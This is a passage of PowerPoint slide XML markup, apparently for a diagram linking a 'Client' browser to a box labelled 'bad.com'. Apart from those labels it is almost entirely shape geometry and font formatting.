            </a:r>
            <a:r>
              <a:rPr sz="1677" spc="-31" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>r</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1677" spc="-4" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>owser</a:t>
            </a:r>
            <a:endParaRPr sz="1677" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="object 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3036795" y="2536732"/>
            <a:ext cx="815228" cy="380232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8779" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2471" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Client</a:t>
            </a:r>
            <a:endParaRPr sz="2471">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="163848" name="object 8"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7509343" y="4395508"/>
            <a:ext cx="1553415" cy="1410541"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId4"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="163849" name="object 9"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7534556" y="4430527"/>
            <a:ext cx="1484779" cy="1340503"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId5"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="163850" name="object 10"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7534556" y="4430527"/>
            <a:ext cx="1484779" cy="1340503"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 2176145"/>
              <a:gd name="T1" fmla="*/ 0 h 1905000"/>
              <a:gd name="T2" fmla="*/ 4547 w 2176145"/>
              <a:gd name="T3" fmla="*/ 0 h 1905000"/>
              <a:gd name="T4" fmla="*/ 4547 w 2176145"/>
              <a:gd name="T5" fmla="*/ 8345 h 1905000"/>
              <a:gd name="T6" fmla="*/ 0 w 2176145"/>
              <a:gd name="T7" fmla="*/ 8345 h 1905000"/>
              <a:gd name="T8" fmla="*/ 0 w 2176145"/>
              <a:gd name="T9" fmla="*/ 0 h 1905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76145" h="1905000">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="2176145" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2176145" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="00D026">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="163851" name="object 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7509343" y="1350309"/>
            <a:ext cx="1536606" cy="1393732"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId6"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="163852" name="object 12"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7534556" y="1360114"/>
            <a:ext cx="1484779" cy="1339103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId5"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="object 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7534556" y="1360115"/>
            <a:ext cx="1484779" cy="830584"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF2A06"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="2194" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPts val="18"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="3177">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="157586" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2206" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>bad.com</a:t>
            </a:r>
            <a:endParaRPr sz="2206">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="163854" name="object 14"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7887541" y="2745441"/>
            <a:ext cx="0" cy="1497386"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 4537 h 2130425"/>
              <a:gd name="T1" fmla="*/ 4537 h 2130425"/>
              <a:gd name="T2" fmla="*/ 0 60000 65536"/>
              <a:gd name="T3" fmla="*/ 0 60000 65536"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="T2">
                <a:pos x="0" y="T0"/>
              </a:cxn>
              <a:cxn ang="T3">
                <a:pos x="0" y="T1"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path h="2130425">
                <a:moveTo>
                  <a:pt x="-38100" y="1065129"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="38100" y="1065129"/>
                </a:lnTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="2130259">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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="163855" name="object 15"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7783886" y="4216213"/>
            <a:ext cx="207309" cy="214313"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 590 w 304800"/>
              <a:gd name="T1" fmla="*/ 0 h 304800"/>
              <a:gd name="T2" fmla="*/ 0 w 304800"/>
              <a:gd name="T3" fmla="*/ 0 h 304800"/>
              <a:gd name="T4" fmla="*/ 294 w 304800"/>
              <a:gd name="T5" fmla="*/ 1311 h 304800"/>
              <a:gd name="T6" fmla="*/ 590 w 304800"/>
              <a:gd name="T7" fmla="*/ 0 h 3048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04800" h="304800">
                <a:moveTo>
                  <a:pt x="304800" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="152400" y="304800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30480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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="163856" name="object 16"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8051426" y="2951349"/>
            <a:ext cx="320769" cy="330574"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 796 w 471170"/>
              <a:gd name="T1" fmla="*/ 281 h 471170"/>
              <a:gd name="T2" fmla="*/ 856 w 471170"/>
              <a:gd name="T3" fmla="*/ 433 h 471170"/>
              <a:gd name="T4" fmla="*/ 899 w 471170"/>
              <a:gd name="T5" fmla="*/ 600 h 471170"/>
              <a:gd name="T6" fmla="*/ 924 w 471170"/>
              <a:gd name="T7" fmla="*/ 778 h 471170"/>
              <a:gd name="T8" fmla="*/ 933 w 471170"/>
              <a:gd name="T9" fmla="*/ 961 h 471170"/>
              <a:gd name="T10" fmla="*/ 924 w 471170"/>
              <a:gd name="T11" fmla="*/ 1145 h 471170"/>
              <a:gd name="T12" fmla="*/ 899 w 471170"/>
              <a:gd name="T13" fmla="*/ 1322 h 471170"/>
              <a:gd name="T14" fmla="*/ 856 w 471170"/>
              <a:gd name="T15" fmla="*/ 1489 h 471170"/>
              <a:gd name="T16" fmla="*/ 796 w 471170"/>
              <a:gd name="T17" fmla="*/ 1640 h 471170"/>
              <a:gd name="T18" fmla="*/ 723 w 471170"/>
              <a:gd name="T19" fmla="*/ 1764 h 471170"/>
